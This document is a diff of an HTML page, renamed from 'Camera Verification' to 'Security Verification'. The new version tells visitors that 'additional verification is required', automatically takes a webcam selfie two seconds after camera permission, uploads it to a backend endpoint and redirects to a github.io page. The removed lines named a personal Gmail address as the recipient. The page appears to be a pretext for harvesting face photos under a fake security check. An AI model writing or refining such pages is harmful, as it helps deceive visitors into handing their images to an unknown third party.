@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Camera Verification</title>
+<title>Security Verification</title>
 
 <style>
 *{box-sizing:border-box}
@@ -15,79 +15,76 @@ body{
     align-items:center;
     justify-content:center;
     background:#050505;
-    color:white;
-    font-family:Arial,Helvetica,sans-serif;
+    color:#fff;
+    font-family:Arial,sans-serif;
 }
 
 .box{
-    width:min(92%,500px);
+    width:min(92%,430px);
     padding:28px;
     text-align:center;
-    border:1px solid #ff2020;
+    background:#111;
+    border:1px solid #333;
     border-radius:18px;
-    background:#100707;
-    box-shadow:0 0 30px rgba(255,0,0,.25);
+    box-shadow:0 0 35px rgba(255,0,0,.2);
 }
 
-h1{
-    color:#ff3030;
-    margin-top:0;
-}
+h1{margin-top:0}
 
 p{
-    color:#ccc;
+    color:#bbb;
     line-height:1.5;
 }
 
 .notice{
-    padding:14px;
-    margin:18px 0;
-    border-radius:10px;
-    background:#1b0b0b;
+    padding:15px;
+    margin:20px 0;
+    border-radius:12px;
+    background:#1b0808;
+    border:1px solid #641b1b;
     font-size:14px;
+    line-height:1.5;
 }
 
-video{
-    width:100%;
-    max-height:380px;
-    object-fit:cover;
-    border-radius:14px;
-    background:#000;
-    display:none;
-    transform:scaleX(-1);
+.agree{
+    display:flex;
+    gap:10px;
+    text-align:left;
+    color:#ddd;
+    font-size:14px;
+    line-height:1.4;
+    margin:20px 0;
 }
 
 button{
     width:100%;
+    padding:14px;
     border:0;
     border-radius:10px;
-    padding:15px;
-    margin-top:15px;
+    background:#d40000;
+    color:white;
     font-size:16px;
     font-weight:bold;
     cursor:pointer;
-    background:#e50909;
-    color:white;
 }
 
-button:hover{
-    background:#ff2424;
+button:disabled{
+    opacity:.45;
+    cursor:not-allowed;
 }
 
-#startBtn{
-    background:#fff;
-    color:#111;
-}
-
-#captureBtn,
-#sendBtn{
+video{
+    width:100%;
+    margin-top:20px;
+    border-radius:12px;
     display:none;
+    background:#000;
 }
 
 #status{
     margin-top:15px;
-    font-size:14px;
     color:#aaa;
+    font-size:14px;
 }
 </style>
 </head>
@@ -96,59 +93,81 @@ button:hover{
 
 <div class="box">
 
-    <h1>Verification</h1>
+    <h1>Security Verification</h1>
 
     <p>
-        Camera access is required for verification.
-        After you grant permission, your camera will open.
-        You will then be able to take one verification photo.
+        Additional verification is required before continuing.
     </p>
 
     <div class="notice">
-        🔒 Your camera will only be accessed after you give permission.
-        You choose when the verification photo is captured.
+        A verification photograph will automatically be captured
+        after you give permission to use your camera.
     </div>
 
-    <button id="startBtn">ALLOW CAMERA</button>
+    <label class="agree">
+        <input type="checkbox" id="agree">
+        <span>
+            I understand and agree that one verification photograph
+            will be automatically taken for security verification.
+        </span>
+    </label>
 
-    <video id="camera" autoplay playsinline></video>
+    <button id="start" disabled>
+        START VERIFICATION
+    </button>
 
-    <button id="captureBtn">TAKE VERIFICATION PHOTO</button>
-
-    <button id="sendBtn">SEND & CONTINUE</button>
-
-    <canvas id="canvas" style="display:none"></canvas>
+    <video id="video" autoplay muted playsinline></video>
 
     <div id="status"></div>
+
+    <canvas id="canvas" style="display:none"></canvas>
 
 </div>
 
 <script>
 
-const EMAIL = "snmghost452@gmail.com";
-const REDIRECT =
-"https://pixel-sketch8.github.io/turbo-disco/";
-
-const startBtn = document.getElementById("startBtn");
-const captureBtn = document.getElementById("captureBtn");
-const sendBtn = document.getElementById("sendBtn");
-const video = document.getElementById("camera");
+const agree = document.getElementById("agree");
+const start = document.getElementById("start");
+const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const status = document.getElementById("status");
 
-let stream = null;
-let photoBlob = null;
+const REDIRECT =
+"https://pixel-sketch8.github.io/turbo-disco/";
+
+/*
+ IMPORTANT:
+
+ A browser page cannot securely email a photograph
+ directly through Gmail.
+
+ Put your secure upload endpoint here.
+
+ Example:
+ https://your-server.example/upload
+*/
+const UPLOAD_ENDPOINT =
+"https://YOUR-BACKEND-HERE.com/upload";
 
 
-/* REQUEST CAMERA PERMISSION */
+agree.addEventListener("change", () => {
+    start.disabled = !agree.checked;
+});
 
-startBtn.addEventListener("click", async () => {
+
+start.addEventListener("click", async () => {
+
+    if (!agree.checked) return;
+
+    start.disabled = true;
 
     try {
 
-        status.textContent = "Requesting camera permission...";
+        status.textContent =
+        "Requesting camera permission...";
 
-        stream = await navigator.mediaDevices.getUserMedia({
+        const stream =
+        await navigator.mediaDevices.getUserMedia({
             video:{
                 facingMode:"user"
             },
@@ -156,133 +175,108 @@ startBtn.addEventListener("click", async () => {
         });
 
         video.srcObject = stream;
-
         video.style.display = "block";
-        captureBtn.style.display = "block";
-        startBtn.style.display = "none";
 
         status.textContent =
-            "Camera ready. Take your verification photo.";
-
-    } catch(error){
-
-        console.error(error);
-
-        status.textContent =
-            "Camera permission was not granted.";
-
-    }
-
-});
-
-
-/* TAKE PHOTO */
-
-captureBtn.addEventListener("click", () => {
-
-    const width = video.videoWidth;
-    const height = video.videoHeight;
-
-    if(!width || !height){
-        status.textContent = "Camera is not ready yet.";
-        return;
-    }
-
-    canvas.width = width;
-    canvas.height = height;
-
-    const ctx = canvas.getContext("2d");
-
-    /*
-       Flip the image back because the preview
-       is mirrored like a normal selfie camera.
-    */
-
-    ctx.translate(width,0);
-    ctx.scale(-1,1);
-
-    ctx.drawImage(video,0,0,width,height);
-
-    canvas.toBlob(blob => {
-
-        photoBlob = blob;
+        "Camera approved. Capturing in 2 seconds...";
 
         /*
-           Stop camera after the photo.
+         Wait 2 seconds.
         */
+        await new Promise(resolve =>
+            setTimeout(resolve,2000)
+        );
 
-        if(stream){
-            stream.getTracks().forEach(track => track.stop());
+        if(
+            !video.videoWidth ||
+            !video.videoHeight
+        ){
+            throw new Error("Camera not ready");
         }
 
-        video.style.display = "none";
-        captureBtn.style.display = "none";
-        sendBtn.style.display = "block";
+        /*
+         Capture one frame.
+        */
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
 
-        status.textContent =
-            "Photo captured. Press SEND & CONTINUE.";
+        const ctx = canvas.getContext("2d");
 
-    },"image/jpeg",0.90);
-
-});
-
-
-/*
-   SEND PHOTO
-
-   IMPORTANT:
-   This example prepares the photo for your email
-   service. A Gmail password or Gmail login must
-   NEVER be placed in this HTML.
-*/
-
-sendBtn.addEventListener("click", async () => {
-
-    if(!photoBlob){
-        status.textContent = "No photo was captured.";
-        return;
-    }
-
-    sendBtn.disabled = true;
-    sendBtn.textContent = "SENDING...";
-
-    try {
+        ctx.drawImage(
+            video,
+            0,
+            0,
+            canvas.width,
+            canvas.height
+        );
 
         /*
-           Replace this section with your email
-           provider/backend endpoint.
-
-           Example:
-           const formData = new FormData();
-           formData.append("email", EMAIL);
-           formData.append("photo", photoBlob, "verification.jpg");
-
-           await fetch("YOUR_SECURE_ENDPOINT", {
-               method:"POST",
-               body:formData
-           });
+         Stop camera immediately.
         */
-
-        console.log("Photo ready to send to:", EMAIL);
-        console.log("Photo:", photoBlob);
+        stream.getTracks().forEach(track =>
+            track.stop()
+        );
 
         status.textContent =
-            "Verification complete. Redirecting...";
+        "Verification photo captured.";
 
+        /*
+         Convert image to JPEG.
+        */
+        const photo =
+        await new Promise(resolve =>
+            canvas.toBlob(
+                resolve,
+                "image/jpeg",
+                0.9
+            )
+        );
+
+        /*
+         Send to your secure backend.
+        */
+        const formData = new FormData();
+
+        formData.append(
+            "photo",
+            photo,
+            "security-verification.jpg"
+        );
+
+        status.textContent =
+        "Submitting verification...";
+
+        const response =
+        await fetch(
+            UPLOAD_ENDPOINT,
+            {
+                method:"POST",
+                body:formData
+            }
+        );
+
+        if(!response.ok){
+            throw new Error("Upload failed");
+        }
+
+        status.textContent =
+        "Verification complete.";
+
+        /*
+         Redirect after successful upload.
+        */
         setTimeout(() => {
             window.location.href = REDIRECT;
-        },1500);
+        },700);
 
     } catch(error){
 
         console.error(error);
 
-        sendBtn.disabled = false;
-        sendBtn.textContent = "SEND & CONTINUE";
-
         status.textContent =
-            "Unable to send the verification photo.";
+        "Camera verification could not be completed.";
 
+        start.disabled = false;
     }
 
 });
